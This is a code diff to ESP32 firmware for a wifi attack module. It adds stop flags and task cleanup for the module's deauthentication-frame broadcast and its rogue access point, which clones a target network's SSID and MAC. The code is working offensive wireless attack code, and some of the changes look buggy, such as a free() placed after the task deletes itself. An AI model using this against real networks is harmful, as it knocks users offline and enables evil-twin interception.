@@ -12,6 +12,7 @@ static TaskHandle_t task_rogue_attack = NULL;
 static wifi_config_t default_ap;
 
 static bool running_broadcast_attack = false;
+static bool running_rogueap_attack = false;
 
 static const uint8_t deauth_frame_default[] = {
     0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
@@ -50,6 +51,7 @@ static void wifi_attack_rogueap(const wifi_ap_record_t* ap_record);
 
 static void attack_brodcast_send_raw_frame(const uint8_t* frame_buffer,
                                            int size) {
+  ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Sending raw frame");
   esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
   if (err != ESP_OK) {
     ESP_LOGE(TAG_WIFI_ATTACK_MODULE, "Failed to send raw frame: %s",
@@ -71,9 +73,12 @@ static void wifi_attack_brod_send_deauth_frame(wifi_ap_record_t* ap_target) {
     vTaskDelay(1000 / portTICK_PERIOD_MS);
   }
   vTaskSuspend(task_brod_attack);
+  vTaskDelete(NULL);
+  free(deauth_frame);
 }
 
 static void wifi_attack_rogueap(const wifi_ap_record_t* ap_record) {
+  running_rogueap_attack = true;
   ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Configuring Rogue AP SSID: %s",
            ap_record->ssid);
   wifi_driver_set_ap_mac(ap_record->bssid);
@@ -84,22 +89,23 @@ static void wifi_attack_rogueap(const wifi_ap_record_t* ap_record) {
              .password = "dummypassword",
              .max_connection = 1},
   };
-  mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
+  mempcpy(ap_config.ap.ssid, ap_record->ssid, 32);
 
   wifi_driver_ap_start(&ap_config);
-  while (true) {
+  while (running_rogueap_attack) {
     vTaskDelay(10000 / portTICK_PERIOD_MS);
   }
   vTaskSuspend(task_rogue_attack);
+  vTaskDelete(NULL);
 }
 
 void wifi_attacks_module_stop() {
   running_broadcast_attack = false;
+  running_rogueap_attack = false;
   if (task_brod_attack != NULL) {
-    vTaskDelete(task_brod_attack);
+    vTaskSuspend(task_brod_attack);
   }
   if (task_rogue_attack != NULL) {
-    default_ap = wifi_driver_access_point_begin();
     wifi_driver_restore_ap_mac();
   }
 }
